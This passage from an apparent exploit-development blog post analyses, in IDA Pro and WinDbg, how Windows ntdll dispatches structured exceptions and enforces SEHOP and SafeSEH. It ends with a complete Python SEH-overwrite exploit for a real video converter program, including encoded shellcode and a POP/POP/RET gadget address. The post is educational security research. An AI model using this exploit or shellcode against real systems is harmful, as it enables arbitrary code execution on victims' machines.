<em>KiUserExceptionDispatcher</em> from <em>ntdll.dll</em>. Let’s disassemble it in IDA Pro.</p><p>Be careful to pick <code class="language-plaintext highlighter-rouge">C:\Windows\SysWOW64\ntdll.dll</code> as this is the one used for 32 bit processes</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/SEH/ida1.png" alt="" /> <em>Graph view of the *KiUserExceptionDispatcher* function</em></p><p>This is a very short function which pretty much just calls <em>RtlDispatchException</em> and then checks the return value. If <em>RtlDispatchException</em> returns 0 (ie. the exception was not handled) it then raises the exception again using <em>ZwRaiseException</em>. On the other hand, if the exception was handled correctly, it continues the process using <em>ZwContinue</em>.</p><p>Moving on to <em>RtlDispatchException</em>, this one seems a little more interesting :</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/SEH/ida2.png" alt="" /> <em>Graph view of the *RtlDispatchException* function</em></p><p>It starts by doing of few checks. For instance it uses <em>LdrControlFlowGuardEnforced</em> to determine if <a href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard"><em>Control Flow Guard</em></a> is on. If it is, it then it calls <em>RtlGuardIsValidStackPointer</em> which checks if <em>ESP</em> is located between the top and the bottom of the stack and aborts if its not.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/SEH/ida3.png" alt="" /> <em>Checking if Control Flow Guard is enabled and calling RtlGuardIsValidStackPointer if it is</em></p><p>Regardless, in our case, breaking after <em>LdrControlFlowGuardEnforced</em> and checking its return value shows that <em>Control Flow Guard</em> is not enabled.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/SEH/windbg3.png" alt="" /> <em>LdrControlFlowGuardEnforced returns 0 (in the eax register) which means Control Flow Guard is not enabled</em></p><p>Next up, <a href="https://docs.microsoft.com/en-us/windows/win32/debug/vectored-exception-handling"><em>Vectored Exception Handlers</em></a> are called. This is another exception handling mechanism introduced in <em>Windows XP</em>. They are pretty similar to <em>SEH</em> with a few key differences. We won’t get too much into the details but here is are some quick facts about <em>Vectored Exception Handling</em> :</p><ul><li>As we just saw, they have priority over SEH.<li>They are explicitly added in the source code using the <em>AddVectoredExceptionHandler</em> function.<li>The main difference with SEH is that they are not tied to a specific function, they handle exceptions for the whole application.</ul><p>If the vectored handler successfully handled the exception, <em>RtlDispatchException</em> then returns with the value 1. Otherwise we move on to <em>Structured Exception Handlers</em>.</p><p>It starts by calling <em>RtlpGetStackLimits</em>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/SEH/ida4.png" alt="" /> <em>Graph view of the *RtlpGetStackLimits* function</em></p><p>This function retrieves the stack’s base (highest address) and limit (lowest address) from the <a href="https://en.wikipedia.org/wiki/Win32_Thread_Information_Block"><em>Thread Information Block</em></a> respectively at <em>FS:[0x04]</em> and <em>FS:[0x08]</em> and stores them on the stack.</p><p>It also makes sure that ebp + 4 lands in between the stack’s base and limit addresses. If the check fails, the function returns 0, otherwise it returns 1.</p><p>Moving on, it then calls the <em>QueryInformationProcess</em> function. Breaking on it in WinDbg we can see that it gets passed the argument 0x22 which which is not documented in the <a href="https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess">Microsoft documentation about this function</a>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/SEH/windbg4.png" alt="" /> <em>QueryInformationProcess gets passed the argument 0x22</em></p><p>It turns out this call corresponds to querying the <em>ProcessExecuteFlags</em>. However documentation on those flags is hard to come by. After hours of Googling, I found the following definition for those execution flags :</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="cp">#define MEM_EXECUTE_OPTION_DISABLE 0x1 
#define MEM_EXECUTE_OPTION_ENABLE 0x2
#define MEM_EXECUTE_OPTION_DISABLE_THUNK_EMULATION 0x4
#define MEM_EXECUTE_OPTION_PERMANENT 0x8
#define MEM_EXECUTE_OPTION_EXECUTE_DISPATCH_ENABLE 0x10
#define MEM_EXECUTE_OPTION_IMAGE_DISPATCH_ENABLE 0x20
#define MEM_EXECUTE_OPTION_DISABLE_EXCEPTIONCHAIN_VALIDATION 0x40
#define MEM_EXECUTE_OPTION_VALID_FLAGS 0x7f
</span></pre></table></code></div></div><p>The function checks if the 0x40 flag of the returned bitmap is set and if not, it calls <em>RtlpIsValidExceptionChain</em>. This is how <a href="https://msrc-blog.microsoft.com/2009/02/02/preventing-the-exploitation-of-structured-exception-handler-seh-overwrites-with-sehop/"><strong>SEHOP</strong></a> is enforced.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/SEH/ida5.png" alt="" /> <em>QueryInformationProcess is called with de 0x22 flag. If the 0x40 flag of the returned bitmap is not set, then SEHOP is enforce</em></p><p>Following that, the address of the current <em>Exception Registration Record</em> is loaded and the dispatcher checks that :</p><ul><li>The exception handler code is not located on the stack (this is the check we failed in our first exploit)<li>The <em>Exception Registration Record</em> is located on the stack<li>The address of the <em>Exception Registration Record</em> is byte aligned</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/SEH/ida6.png" alt="" /> <em>Checks to make sure the exception registration record is on the stack and the exception handler isn’t</em></p><p>So this is the reason why our previous exploit did not work ! It’s also why the POP/POP/RET technique is necessary even when the program is not compiled with <em>/SAFESEH</em>.</p><p>After that we finally reach <em>RtlIsValidHandler</em> which is where SafeSEH actually gets enforced. More precisely, <em>RtlIsValidHandler</em> calls <em>RtlpxLookupFunctionTable</em> which performs a search through the registered handlers table.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/SEH/ida7.png" alt="" /> <em>Part of RtlpxLookupFunctionTable where the search through the resgistered handlers tables is done</em></p><p>Here is the loop in <em>RtlpxLookupFunctionTable</em> that searches through the table of valid exception handlers.</p><p><em>RtlIsValidHandler</em> also performs some other checks such as verifying if DEP is enabled and if so,<br /> making sure that the exception handler is in an executable memory page.</p><h2 id="wrapping-up">Wrapping up</h2><hr /><p>All this time spent staring at assembly helped us understand why our exploit was failing. It is not because of <em>SafeSEH</em>, but because of an other check done when dispatching exceptions which makes sure that the exception handler code is not located on the stack.</p><p>This is the real reason why the POP/POP/RET technique is used : bouncing to an address outisde of the stack before coming back to the shellcode allow us to bypass the check.</p><p>Now let’s wrap up the exploit quicly using the POP/POP/RET technique.</p><p>Using the <code class="language-plaintext highlighter-rouge">!mona seh</code> command to help us locate interesting POP/POP/RET gadgets and we can choose one that is compliant with our badchars requirements such as :</p><blockquote><div class="table-wrapper"><table><tbody><tr><td>0x00445835 : pop esi # pop ecx # ret<td>startnull,asciiprint,ascii,alphanum,uppernum {PAGE_EXECUTE_READWRITE} [bsvideoconverter.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v4.2.8.1 (C:\Program Files (x86)\Torrent 3GP Converter\bsvideoconverter.exe)</table></div></blockquote><p>Some ESP adjustments are then needed to end up executing the shellcode on the stack but I won’t go into the details.</p><h2 id="conclusion">Conclusion</h2><hr /><h2 id="final-exploit">Final Exploit</h2><hr /><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
</pre><td class="rouge-code"><pre><span class="c1"># AlphaNum GetEIP
</span><span class="n">shellcode</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x4c</span><span class="s">"</span><span class="o">*</span><span class="mi">4</span> <span class="c1"># dec esp * 4
</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x59</span><span class="s">"</span> <span class="c1"># pop ecx
</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x83\xC1\x08</span><span class="s">"</span> <span class="c1"># add ecx, 0x8
</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34\x41</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x4a\x4a\x49\x4b\x4c\x4b\x58\x4c\x42\x33\x30</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x33\x30\x33\x30\x55\x30\x4b\x39\x5a\x45\x46</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x51\x49\x50\x42\x44\x4c\x4b\x36\x30\x50\x30</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x4c\x4b\x50\x52\x44\x4c\x4c\x4b\x51\x42\x35</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x44\x4c\x4b\x32\x52\x47\x58\x44\x4f\x48\x37</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x50\x4a\x37\x56\x36\x51\x4b\x4f\x4e\x4c\x47</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x4c\x45\x31\x53\x4c\x34\x42\x46\x4c\x57\x50</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x49\x51\x38\x4f\x44\x4d\x53\x31\x48\x47\x4b</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x52\x5a\x52\x31\x42\x31\x47\x4c\x4b\x56\x32</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x52\x30\x4c\x4b\x30\x4a\x37\x4c\x4c\x4b\x30</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x4c\x42\x31\x33\x48\x4a\x43\x57\x38\x45\x51</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x38\x51\x30\x51\x4c\x4b\x51\x49\x57\x50\x35</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x51\x48\x53\x4c\x4b\x47\x39\x42\x38\x5a\x43</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x37\x4a\x47\x39\x4c\x4b\x36\x54\x4c\x4b\x55</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x51\x48\x56\x50\x31\x4b\x4f\x4e\x4c\x4f\x31</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x38\x4f\x54\x4d\x45\x51\x49\x57\x36\x58\x4d</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x30\x34\x35\x4c\x36\x54\x43\x43\x4d\x4a\x58</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x37\x4b\x33\x4d\x37\x54\x53\x45\x5a\x44\x56</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x38\x4c\x4b\x31\x48\x37\x54\x53\x31\x59\x43</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x32\x46\x4c\x4b\x54\x4c\x50\x4b\x4c\x4b\x30</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x58\x35\x4c\x43\x31\x39\x43\x4c\x4b\x53\x34</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x4c\x4b\x43\x31\x58\x50\x4b\x39\x30\x44\x57</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x54\x51\x34\x31\x4b\x51\x4b\x35\x31\x51\x49</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x31\x4a\x56\x31\x4b\x4f\x4b\x50\x51\x4f\x51</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x4f\x50\x5a\x4c\x4b\x44\x52\x5a\x4b\x4c\x4d</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x31\x4d\x53\x5a\x55\x51\x4c\x4d\x4d\x55\x58</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x32\x55\x50\x35\x50\x43\x30\x56\x30\x43\x58</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x36\x51\x4c\x4b\x42\x4f\x4d\x57\x4b\x4f\x48</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x55\x4f\x4b\x4c\x30\x4e\x55\x39\x32\x46\x36</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x53\x58\x49\x36\x4d\x45\x4f\x4d\x4d\x4d\x4b</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x4f\x49\x45\x47\x4c\x43\x36\x33\x4c\x54\x4a</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x4b\x30\x4b\x4b\x4d\x30\x53\x45\x43\x35\x4f</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x4b\x57\x37\x54\x53\x54\x32\x32\x4f\x53\x5a</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x35\x50\x36\x33\x4b\x4f\x4e\x35\x42\x43\x33</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x51\x32\x4c\x53\x53\x35\x50\x41\x41</span><span class="s">"</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">"E"</span><span class="o">*</span><span class="mi">20</span><span class="o">*</span><span class="mi">4</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mi">4</span><span class="o">-</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span><span class="p">))</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x41\x48\xD2\x19</span><span class="s">"</span><span class="o">*</span><span class="p">((</span><span class="mi">4228</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span><span class="o">/</span><span class="mi">4</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x83\xC4\x8B\x90</span><span class="s">"</span> <span class="c1"># add esp, -0x75 
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x83\xC4\x8A\xC3</span><span class="s">"</span> <span class="c1"># add esp, -0x76
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x41\x48\xD2\x19</span><span class="s">"</span><span class="o">*</span><span class="p">((</span><span class="mi">4500</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span><span class="o">/</span><span class="mi">4</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x83\xC4\x54\xC3</span><span class="s">"</span> <span class="c1">#nSEH
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x35\x58\x44</span><span class="s">"</span> <span class="c1">#SEH
</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"buf.txt"</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">inp</span><span class="p">:</span>
    <span class="n">inp</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/exploit-development/'>Exploit development</a>, <a href='/categories/windows/'>Windows</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/exploits/" class="post-tag no-text-decoration" >Exploits</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >Windows</a> <a href="/tags/seh/" class="post-tag no-text-decoration" >SEH</a> <a href="/tags/reverse-engineering/" class="post-tag no-text-decoration" >Reverse Engineering</a> <a href="/tags/debugging/" class="post-tag no-text-decoration" >Debugging</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Clearing up Windows SEH exploitation - RAC Blog&url=https://Richard-AC.github.io/posts/SEH/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Clearing up Windows SEH exploitation - RAC Blog&u=https://Richard-AC.github.io/posts/SEH/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Clearing up Windows SEH exploitation - RAC Blog&url=https://Richard-AC.github.io/posts/SEH/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/rdbg/">rdbg - A Rust library for writing custom Windows debuggers</a><li><a href="/posts/fuzzing-brava/">Fuzzing Closed-Source Windows Programs</a><li><a href="/posts/old_page/">My portfolio</a><li><a href="/posts/SEH/">Clearing up Windows SEH exploitation</a><li><a href="/posts/sudo-cve/">Exploiting CVE-2021-3156 (sudo heap overflow)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/debugging/">Debugging</a> <a class="post-tag" href="/tags/exploits/">Exploits</a> <a class="post-tag" href="/tags/reverse-engineering/">Reverse Engineering</a> <a class="post-tag" href="/tags/archive/">archive</a> <a class="post-tag" href="/tags/automation/">Automation</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/cve-2021-3156/">CVE-2021-3156</a> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/fuzzing/">Fuzzing</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/rdbg/"><div class="card-body"> <span class="timeago small" > Feb 27 <i class="unloaded">2023-02-27T08:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>rdbg - A Rust library for writing custom Windows debuggers</h3><div class="text-muted small"><p> rdbg on Github Introduction Writing a custom debugger can be very useful for many program analysis tasks. MSDN provides a useful template which I ended up using many times including in my Triage...</p></div></div></a></div><div class="card"> <a href="/posts/fuzzing-brava/"><div class="card-body"> <span class="timeago small" > Sep 17, 2021 <i class="unloaded">2021-09-17T19:33:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Fuzzing Closed-Source Windows Programs</h3><div class="text-muted small"><p> Introduction This article describes how I harnessed and fuzzed a closed-source Windows program. Doing so, I found a few zero-days and got paid my first bounty ever! Target selection To select...</p></div></div></a></div><div class="card"> <a href="/posts/sudo-cve/"><div class="card-body"> <span class="timeago small" > Feb 16, 2021 <i class="unloaded">2021-02-16T19:33:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Exploiting CVE-2021-3156 (sudo heap overflow)</h3><div class="text-muted small"><p> Introduction Last month, in this article, Qualys disclosed a vulnerability that has been affecting all versions of the program sudo for the last 10 years which can lead to a local privilege esc...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/old_page/" class="btn btn-outline-primary"><p>My portfolio</p></a> <a href="/posts/sudo-cve/" class="btn btn-outline-primary"><p>Exploiting CVE-2021-3156 (sudo heap overflow)</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/username">Richard AC</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/debugging/">Debugging</a> <a class="post-tag" href="/tags/exploits/">Exploits</a> <a class="post-tag" href="/tags/reverse-engineering/">Reverse Engineering</a> <a class="post-tag" href="/tags/archive/">archive</a> <a class="post-tag" href="/tags/automation/">Automation</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/cve-2021-3156/">CVE 2021 3156</a> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/fuzzing/">Fuzzing</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script> <script> $(function() { let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://Richard-AC.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
